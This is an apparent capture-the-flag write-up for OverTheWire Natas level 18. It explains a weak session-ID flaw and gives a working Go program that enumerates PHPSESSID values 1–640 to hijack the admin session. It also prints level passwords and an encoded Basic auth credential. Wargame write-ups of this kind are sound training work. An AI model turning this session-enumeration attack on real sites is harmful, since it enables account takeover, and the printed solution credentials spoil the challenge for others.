- - -
# 🚩 OverTheWire: Natas Wargame Solutions - Level 18
The target application suffers from **Weak Session ID Generation**.
- **The Flaw:** The PHP source defines `$maxid = 640`, meaning all valid session IDs are integers between `1` and `640`.
- **The Vector:** Since the "Login" function is hardcoded to fail, the only entry method is **Session Hijacking**—finding an existing session ID where the user is already authenticated as an admin.
This code performs a concurrent brute-force attack to enumerate the active Admin Session ID.
```bash
# download the code and run this command
go run main.go
```
	pass = `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`

```golang
package main

import (
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"sync"
)

var (
	client = &http.Client{}
)
func main() {
	var wg sync.WaitGroup
	for i := 1; i < 641; i++ {
		ctx, cancel := context.WithCancel(context.Background())
		wg.Add(1)
		go attack(ctx, &wg, i, cancel)
	}
	wg.Wait()
}

func attack(ctx context.Context,wg *sync.WaitGroup, phpSessID int, cancel context.CancelFunc) {
	defer wg.Done()
    select {
    case <-ctx.Done():
        return
    default:
	}

	var url string = "http://natas18.natas.labs.overthewire.org/index.php"
	req, err := http.NewRequest("POST", url, strings.NewReader("username=user&password=pass"))
	if err != nil {
		return
	}

	req.Host = "natas18.natas.labs.overthewire.org"
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate") // Note: The client will handle decompression if needed.
	req.Header.Set("Origin", "http://natas18.natas.labs.overthewire.org")
	req.Header.Set("Authorization", "Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==")
	req.Header.Set("Cookie", fmt.Sprintf("PHPSESSID=%d", phpSessID))
	resp, err := client.Do(req.WithContext(ctx))
	if err != nil {
		return
	}
	defer resp.Body.Close()

	var reader io.ReadCloser

	if resp.Header.Get("Content-Encoding") == "gzip" {
		reader, err = gzip.NewReader(resp.Body)
		if err != nil {
			return
		}
		defer reader.Close()
	} else {
		reader = resp.Body
	}
	body, err := io.ReadAll(reader)
	if err != nil {
		fmt.Println(err)
		return
	}
	if strings.Contains(string(body), "You are an admin. The credentials for the next level are") {
		fmt.Println("session ID for admin:", phpSessID)
		re := regexp.MustCompile(`Password:\s*([A-Za-z0-9]+)`)
		matches := re.FindStringSubmatch(string(body))
		if len(matches) > 1 {
    		fmt.Println("Password:", matches[1])
		}
		cancel()
	}

}

```
